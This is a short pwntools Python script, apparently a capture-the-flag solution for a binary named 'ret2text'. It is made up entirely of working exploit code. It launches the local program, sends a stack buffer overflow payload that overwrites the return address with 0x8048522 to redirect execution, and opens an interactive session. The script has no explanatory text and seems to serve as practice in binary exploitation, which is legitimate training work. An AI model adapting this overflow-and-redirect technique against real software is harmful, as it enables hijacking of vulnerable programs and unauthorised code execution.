from pwn import *

io=process("./ret2text")
io.recvline()
payload=b'A'*16+b'A'*4+p32(0x8048522)
io.sendline(payload)
io.interactive()
